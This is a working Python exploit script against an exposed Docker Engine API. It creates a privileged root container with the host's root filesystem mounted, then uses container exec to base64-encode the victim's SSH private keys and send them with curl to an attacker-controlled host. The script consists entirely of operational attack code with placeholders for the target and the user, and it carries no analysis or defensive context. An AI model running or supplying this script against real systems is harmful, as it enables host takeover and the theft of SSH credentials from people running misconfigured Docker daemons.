import requests
import json
import time

# === CONFIG ===
target = "http://x.X.x.X:xxxx"
image = "<YOUR IMAGE>"
attacker_host = "http://x.X.x.X:8000"
username = "<PICK A USER>"
container_cmd = "while true; do sleep 1; done"

home = f"/host/home/{username}/.ssh"
key_files = ["id_rsa", "id_ecdsa", "id_ed25519"]

def exec_command(container_id, command):
    print(f"[*] Exec: {command}")
    exec_payload = {
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["sh", "-c", command]
    }
    r = requests.post(f"{target}/containers/{container_id}/exec", json=exec_payload)
    exec_id = r.json().get("Id")
    if not exec_id:
        print("[-] Failed to create exec")
        return None
    r = requests.post(f"{target}/exec/{exec_id}/start", json={"Detach": False, "Tty": False})
    return r.status_code == 200

# Step 1: Create container
print("[*] Creating container...")
container_create_payload = {
    "Image": image,
    "User": "0",
    "Cmd": ["sh", "-c", container_cmd],
    "HostConfig": {
        "Binds": ["/:/host"],
        "Privileged": True
    }
}
r = requests.post(f"{target}/containers/create", json=container_create_payload)
if r.status_code != 201:
    print("[-] Container creation failed:", r.text)
    exit(1)
container_id = r.json()["Id"]
print(f"[+] Container ID: {container_id}")

# Step 2: Start container
print("[*] Starting container...")
r = requests.post(f"{target}/containers/{container_id}/start")
if r.status_code not in [204, 200]:
    print("[-] Failed to start container:", r.text)
    exit(1)
print("[+] Container running")
time.sleep(2)

# Step 3: Try each SSH key
for key in key_files:
    ssh_path = f"{home}/{key}"
    post_path = f"{username}_{key}"
    exfil_cmd = f"base64 {ssh_path} | curl -X POST -d @- {attacker_host}/ssh/{post_path}"
    print(f"[*] Trying to exfil: {ssh_path}")
    result = exec_command(container_id, exfil_cmd)
    if result:
        print(f"[+] Exfil triggered for: {ssh_path}")
        break
    else:
        print(f"[!] Failed to exfil: {ssh_path}")
